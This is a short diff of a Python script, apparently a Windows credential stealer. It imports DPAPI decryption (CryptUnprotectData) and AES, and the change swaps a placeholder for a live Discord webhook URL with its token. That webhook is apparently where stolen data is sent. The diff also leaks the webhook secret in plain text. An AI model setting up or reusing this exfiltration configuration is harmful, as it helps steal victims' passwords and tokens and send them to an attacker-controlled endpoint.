@@ -17,7 +17,7 @@ import ctypes.wintypes as wintypes
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES 
 
-webhook = "WEBHOOK GOES HERE"
+webhook = "https://discord.com/api/webhooks/1179797544973385748/zBznpuHm9XwNfkXa0kghE9ouDQZOGNxkoCY2A515WKglFPOZBeHNC7idJFmA63tRKvpP"
 forceRead = False
 debug = False # Secret thingy for development (Don't mess with it)
 
